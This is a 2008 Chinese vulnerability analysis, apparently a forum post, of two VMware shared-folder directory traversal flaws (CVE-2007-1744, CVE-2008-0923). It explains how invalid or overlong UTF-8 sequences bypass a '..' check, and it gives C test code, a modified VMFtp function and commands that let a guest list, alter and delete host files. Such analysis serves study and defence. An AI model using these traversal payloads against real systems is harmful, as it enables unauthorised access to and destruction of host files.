
# VMware 漏洞实例分析之一 共享文件夹目录遍历漏洞

> 原文：[`www.pediy.com/kssd/pediy10/74064.html`](https://www.pediy.com/kssd/pediy10/74064.html)

网页上不好排版，想要看的舒服点就下附件中的 PDF 吧，高手飘过。

标题：VMware 漏洞实例分析之一  共享文件夹目录遍历漏洞

作者：vxasm  (mail: `xasm2008@gmail.com`)

时间：2008-10-5

## 一 名词定义

Host 机：运行 VMware 软件的真实主机；

Guest 机：装在 VMware 软件中的虚拟系统；

后门：VMware 有一套自己专有的“Backdoor I/O Port”指令，Host 和 Guest 之间的所有数据都是通过一个固定的 IO 端口，使用 `in` 和 `out` 指令来进行传递，Guest 就是通过这个端口发命令让 Host 帮助它完成某些自身不能完成的工作。

## 二 漏洞背景

理论上来说，可以认为 Host 机和 Guest 机是两台不同的电脑，只不过它们是共享同一套真实的物理硬件，这样就带来一个问题，即如何在 Host 和 Guest 之间传输数据， VMware 的共享文件夹就是解决该问题的一个很实用功能，不需要设置任何网络，就可以在 Host 和 Guest 机器间互相传输文件。至于怎么设置共享文件夹，不是本文的重点，就不多说了，不熟悉的建议 Google 一下先。

在安装完 VMware Tools 后，会在 Guest 机上看到一个名为 `Hgfs.sys` 的文件，这个驱动文件实现了一个虚拟的文件系统，这个虚拟文件系统的根目录就是 `\\\\.host`，当你在 Guest 机上进入任何共享文件夹的目录时，可以看到路径都是以 `\\\\.host` 开始的，在这个目录下的所有操作都将通过后门传递给运行在 Host 上的 VMware 主程序。

举例来说：在 Host 机上有个目录是：`E:\\Debug\\Share`，把这个目录设置为 Guest 系统的共享目录后，VMware 会记录下这个目录所对应的 Host 路径是 `E:\\Debug\\Share`，当在 Guest 机的“运行”对话框中输入：`\\\\.host\\Shared Folders\\Share`，就 great 在 Guest 上打开 `E:\\Debug\\Share` 这个目录。这个过程是通过后门完成的，Guest 把“遍历目录”命令传递给 Host，Host 上的 VMware 主程序找到该目录对应关系，通过 API 函数遍历 `E:\\Debug\\Share` 目录，把得到的数据通过后门返回给 Guest，最后 Guest 上就列出了 Share 目录下的所有文件。

## 三 漏洞描述

现在就到了本文所要说的重点了。我们知道，当 Guest 位于 `\\\\.host\\Shared Folders\\Share` 目录下时，Guest 执行命令“dir”，就相当于要求 Host 机执行“dir `E:\\Debug\\Share`”，没有问题。那再让 Guest 执行命令“dir `..`”，会发生什么情况呢？如果是 Host 本身在执行这条命令，没有问题，自然会列出 `E:\\Debug` 下的所有文件；但现在要求执行命令的是 Guest，Host 只设置了 `E:\\Debug\\Share` 这个目录给 Guest，自然是希望 Guest 只能看到这个目录，而没有权限看到它的父目录，因此 VMware 会对含有“..”的路径名作特别处理，处理的结果就是 Guest 上执行这条命令无效。

那么它的处理方法是什么呢？简单说来是这样的，VMware 会对共享文件夹的路径名进行验证，确认它不含有 `0x2e0x2e`（翻译为 ASCII 子字符就是“..”）字符串后，就会将其从多字节字符串转换为宽字符字符串，然后将所生成的宽字符字符串传送给 Host 上的系统文件 API。这个转换使用 Windows API 中的 `MultiByteToWideChar` 函数完成。该函数的原型如下：

```
int MultiByteToWideChar (
UINT CodePage,
DWORD dwFlags,
LPCSTR lpMultiByteStr,
int cbMultiByte,
LPWSTR lpWideCharStr,
int cchWideChar
);
```

这里只对 `dwFlags` 做简单解释。

`dwFlags`：指定是否转换成预制字符或合成的宽字符，对控制字符是否使用像形文字，以及怎样处理无效字符。其中：

`MB_ERR_INVALID_CHARS`：设置此选项，则函数遇到非法字符就失败并返回错误码 `ERROR_NO_UNICODE_TRANSLATION`，否则丢弃非法字符。

正是由于对 `MultiByteToWideChar` 函数中 `dwFlags` 参数的错误使用，导致 VMware 共享文件夹先后出现了两个漏洞，按时间顺序是 `CVE-2007-1744` 和 `CVE-2008-0923`。不过严格说起来，这并非是因为 VMware 开发人员在使用 `MultiByteToWideChar` 函数时的编码错误，而是由于这套验证机制本身在逻辑上就存在一个漏洞。因为：验证“..”字符串是在转换输入字符串之前执行的，因此只要 Guest 系统上的恶意程序或用户提供的路径名可以通过验证，则在调用 `MultiByteToWideChar` 之后仍可能映射为包含有 Unicode UTF-16 版本的“..”字符串。

### 3.1 CVE-2007-1744

受影响版本：

VMWare VMWare Workstation 5.5.3 build 34685

不受影响版本：

VMWare VMWare Workstation 5.5.4 build 44386

这个漏洞的起因是 `dwFlags` 使用了默认值 `0`，这意味着在转换过程中会忽略输入的无效字符，因此可以很容易地构造出一个多字节字符串，轻松地绕过验证，成为 Unicode UTF-16 版本的“..”。示例程序如下：

代码:

```
#include <windows.h>

int main(int argc, char* argv[])
{
  unsigned int ans;
    char utf8[] = { 0xc0,0x2e,0xc0,0x2e }; //0xc0 是无效字符
    wchar_t utf16[100] = { 0 };
    UINT CodePage = CP_UTF8;

    ans = MultiByteToWideChar(CodePage,
            0,
            (LPCSTR)&utf8,
            4,
            (LPWSTR)utf16,
            100);
    
    printf("utf16: %S\n", utf16);
  return 0;
}
```

尽管 `0xc0` 是无效字符，但因为使用的的 `dwFlags` 值是 `0`，所以 `MultiByteToWideChar` 函数会忽略它，而继续转换有效的字符 `0x2e`，所以执行这个程序的输出结果是：utf16: ..

可见，只要我们在输入的路径名中包含“0xc00x2e0xc00x2e”，那么就能够通过 VMware 对 `0x2e0x2e` 的验证，因此 Host 会去访问上层目录，从而让 Guest 看到不应该看到的东西。

### 3.2 CVE-2008-0923

受影响版本

VMWare Workstation 6.0.2

VMWare Workstation 5.5.4

VMWare Player 2.0.2

VMWare Player 1.0.4

VMWare ACE 2.0.2

VMWare ACE 1.0.2

不受影响版本：

VMWare Workstation 6.0.3

VMWare Workstation 5.5.6

VMWare Player 2.0.3

VMWare Player 1.0.5

VMWare ACE 2.0.3

VMWare ACE 1.0.5

VMWare ESX

VMWare Server

由于上个漏洞中 `dwFlags` 参数简单使用了默认值 `0`，导致无效字符也能够顺利通过转换，因此 VMware 的更新版本中将 `dwFlags` 参数的值修改为 `MB_ERR_INVALID_CHARS`，这个宏的整数值是 `8`。这样一来，像上面使用过的“0xc00x2e0xc00x2e”字符串，由于包含了无效字符，就会导致 `MultiByteToWideChar` 函数调用失败了。那么，我们有没有办法构造出一个有效的多字节字符序列，而又能成功转换为 Unicode UTF-16 版本的“..”呢？试一试就知道了，还是让程序来帮忙吧。测试程序如下：

代码:

```
include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
    unsigned int i, ans;
    unsigned char buf[200];
    UINT CodePage = CP_UTF8;

    for (i=1; i; i++)
    {
        memset(buf, 0, 200);
        ans = MultiByteToWideChar(CodePage,
            MB_ERR_INVALID_CHARS, //8
            (LPCSTR)&i,
            4,
            (LPWSTR)buf,
            100);
        if (ans && (buf[0] == '.') && (buf[1] == 0) && ((i & 0xff) != '.'))
        {
            printf("%d %04x: %02x %02x %02x %02x\n", ans, i,
                buf[0], buf[1], buf[2], buf[3]);
            getchar(); // 找到后让程序暂停一下
        }
    }
    
    return 0;
}
```

很快就能找到第 1 个字符序列是“0xc20x2e0xc20x2e”，也就是说它能够通过验证，并且成功地转换为 Unicode UTF-16 版本的“..”。

## 四 漏洞利用

现在，这两个漏洞的形成原因及利用原理已经清楚了，可是怎么样在 VMware 中利用呢？首先我们必须在路径名中包含这些字符，但这些字符又并非可输入字符，并且还不能经过 Guest 系统的 Shell 处理，而必须直接传递给后门才行，所以我们有两种办法可以选择：

1）直接调用 VMware 的后门指令，实现一个简单的“VMware Tools”，将“遍历目录”命令传递给 Host，但是这就要求熟悉后门指令，而且调用过程很繁琐；

2）利用网上现有资源。VM Back Project 是个极好的开放源代码工程，支持多种平台，在 Windows 平台上直接用 VC6 就能编译，它实现了一套直接调用 VMware 后门指令的命令行工具，并且里面列出了 VMware 所有已知的后门指令。其中 `VMFtp` 是一个实用的命令行程序，从名字可以猜到，它模拟了一个 FTP 程序，不过这个 FTP 只限于在 Host 和 Guest 之间传递文件。

为避繁就简，我们以 `VMFtp` 为例，讲解第 2 个漏洞 `CVE-2008-0923` 的利用方法。在 Guest 机上启动 `VMFtp.exe`，默认就进入了共享文件夹，输入“ls”命令（相当于“dir”），将会列出所有的共享目录；假设当前有一个目录名为 Share，那么运行“cd Share”，就会进入 Share 目录；再输入“ls”命令，就会列出 Share 目录下的所有文件；现在再输入“ls ..”显示上层目录，仍然是只能看到我们定义了的共享目录，可见在正常情况下 VMware 屏蔽了包含“0x2e0x2e”的路径。

现在我们对 VMFtp 进行改造，把源代码 `vmw/src/vmshf.c` 中的函数 `ReplaceDelim` 修改为如下：

代码:

```
static void ReplaceDelim(char *str, uint32_t length, char delim)
{
    while (length--)
    {
        if (*(str + length) == '\0' ||
            *(str + length) == '/' ||
            *(str + length) == '\\')
        {
            *(str + length) = delim;
        }
        if (*(str + length) == '+')
            *(str + length) = '\xc2';
    }
}
```

修改的目的就是要让 VMFtp 将我们输入的字符“+”自动替换为“0xc2”，重新编译 VMFtp 后运行。进入 Share 目录，输入“ls +.+. /”，现在能看到什么呢？在 Share 的父目录下所有文件就都列出来了，输入“ls +.+. / +. +. ”，则更上一层目录的文件又都列出来了，再比如输入“ls +.+. / +. +. /soft”之类的路径，以此类推，这样 Share 目录所在整个分区的文件都在 Guest 机上一览无遗了，而且还能做替换、删除文件等操作。VMFtp 在我的 VMware 6.0.2 中的 Guest 运行的情况如下所示：

![](img/26b2e661d882370e300d6b6c77caa38b.jpg)

如果这个共享目录是设在系统盘（如 C 盘）的话，则 Host 机上所有的系统文件都可以被 Guest 上的用户或攻击程序所任意操作，可见这个漏洞的危害还是很大的，解决办法是安装目前最新版本的 VMware 或者禁用共享文件夹（默认情况下为启用）。

## 五 动态调试

最后再简单说一下动态调试这个漏洞的方法，用 OllyICE 附加上正在运行的 `vmware-vmx.exe`，然后下 `Kernel32.MultiByteToWideChar` 断点，因为 `MultiByteToWideChar` 是被 VMware 频繁使用的函数，所以最好用条件断点，可以根据输入字符串的长度来，我使用的条件是：`eax>6&&eax<15`，熟悉 OllyICE 的话可以根据实际运行情况作调整。在调试状态下运行上面所说的命令，就能看到 `MultiByteToWideChar` 转换前和转换后的状态了。如下所示：

转换前的状态：

![](img/0dd5c914383c95d742e70a7760f29bb2.jpg)

转换后的状态：

![](img/4236e105503d70cdbdbc33eed4a7a6f9.jpg)

附件中包含已经修改过的 `VMFtp.exe`，可以直接在 VMware 6.0.2 及以前的版本上测试。

VMFtp 的源代码下载：http://chitchat.at.infoseek.co.jp/vmware/vmw-060510.zip。

## 六 参考资料

1 漏洞发现者：coresecurity 公司的论文。

http://www.coresecurity.com/content/advisory-vmware

2 VM Back Project

http://chitchat.at.infoseek.co.jp/vmware/

上传的附件

|   |

|

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || vmftp.rar

|
